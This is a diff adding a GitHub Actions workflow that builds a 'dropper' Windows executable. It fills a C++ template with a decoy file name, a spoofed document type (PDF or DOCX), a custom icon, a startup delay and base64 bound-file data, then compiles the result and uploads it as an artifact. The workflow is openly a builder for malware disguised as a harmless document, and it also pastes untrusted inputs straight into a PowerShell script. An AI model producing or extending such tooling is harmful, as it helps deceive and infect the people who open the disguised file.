@@ -1,0 +1,64 @@
+name: Build Dropper EXE
+
+on:
+  workflow_dispatch:
+    inputs:
+      file_name:
+        description: 'File name for the dropper'
+        required: true
+        default: 'document.pdf'
+      startup_delay_ms:
+        description: 'Startup delay in milliseconds'
+        required: false
+        default: '0'
+      bound_file_data:
+        description: 'Base64 encoded bound file data (optional)'
+        required: false
+        default: ''
+      spoofed_file_type:
+        description: 'Spoofed file type (e.g., pdf, docx)'
+        required: false
+        default: 'pdf'
+      icon_data:
+        description: 'Base64 encoded icon data (optional)'
+        required: false
+        default: ''
+
+jobs:
+  build-dropper:
+    runs-on: windows-latest
+
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Replace placeholders
+        run: |
+          $content = Get-Content -Path dropper.cpp -Raw
+          $content = $content -replace '{{FILE_NAME}}', '${{ github.event.inputs.file_name }}'
+          $content = $content -replace '{{STARTUP_DELAY_MS}}', '${{ github.event.inputs.startup_delay_ms }}'
+          $content = $content -replace '{{SPOOFED_FILE_TYPE}}', '${{ github.event.inputs.spoofed_file_type }}'
+          if ('${{ github.event.inputs.icon_data }}' -ne '') {
+              $content = $content -replace '{{ICON_DATA}}', '${{ github.event.inputs.icon_data }}'
+          }
+          if ('${{ github.event.inputs.bound_file_data }}' -ne '') {
+              $content = $content -replace '{{BOUND_FILE_DATA}}', '${{ github.event.inputs.bound_file_data }}'
+          }
+          Set-Content -Path dropper.cpp -Value $content
+
+      - name: Set up MSVC
+        uses: ilammy/msvc-dev-cmd@v1
+
+      - name: Compile dropper.cpp
+        run: |
+          cl.exe /O2 /out:dropper.exe dropper.cpp
+          if (-Not (Test-Path dropper.exe)) {
+              Write-Error "Compilation failed - dropper.exe not created"
+              exit 1
+          }
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: dropper-exe
+          path: dropper.exe
+          retention-days: 1
